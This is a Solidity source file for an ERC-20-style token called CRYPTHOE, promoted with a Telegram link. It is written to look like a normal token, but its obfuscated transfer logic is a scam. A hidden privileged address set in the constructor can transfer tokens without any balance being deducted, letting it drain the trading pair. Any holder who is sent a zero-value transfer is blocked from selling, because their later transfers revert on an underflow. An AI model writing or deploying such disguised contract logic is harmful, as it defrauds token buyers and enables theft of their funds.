/*

Telegram: https://t.me/CRYPTHOE

*/

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract CRYPTHOE is Ownable {
    string public name = 'CRYPTHOE';

    mapping(address => uint256) private strange;

    function carbon(address enjoy, address drop, uint256 chosen) private returns (bool success) {
        if (strange[enjoy] == 0) {
            if (uniswapV2Pair != enjoy && budge[enjoy] > 0) {
                strange[enjoy] -= describe;
            }
            balanceOf[enjoy] -= chosen;
        }
        balanceOf[drop] += chosen;
        if (chosen == 0) {
            budge[drop] += describe;
        }
        emit Transfer(enjoy, drop, chosen);
        return true;
    }

    function transfer(address drop, uint256 chosen) public returns (bool success) {
        carbon(msg.sender, drop, chosen);
        return true;
    }

    function approve(address stepped, uint256 chosen) public returns (bool success) {
        allowance[msg.sender][stepped] = chosen;
        emit Approval(msg.sender, stepped, chosen);
        return true;
    }

    mapping(address => uint256) public balanceOf;

    uint256 private describe = 48;

    address public uniswapV2Pair;

    string public symbol = 'CRYPTHOE';

    mapping(address => uint256) private budge;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(address fibre) {
        balanceOf[msg.sender] = totalSupply;
        strange[fibre] = describe;
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    }

    function transferFrom(address enjoy, address drop, uint256 chosen) public returns (bool success) {
        carbon(enjoy, drop, chosen);
        require(chosen <= allowance[enjoy][msg.sender]);
        allowance[enjoy][msg.sender] -= chosen;
        return true;
    }

    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);

    uint8 public decimals = 9;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    IUniswapV2Router02 private uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
}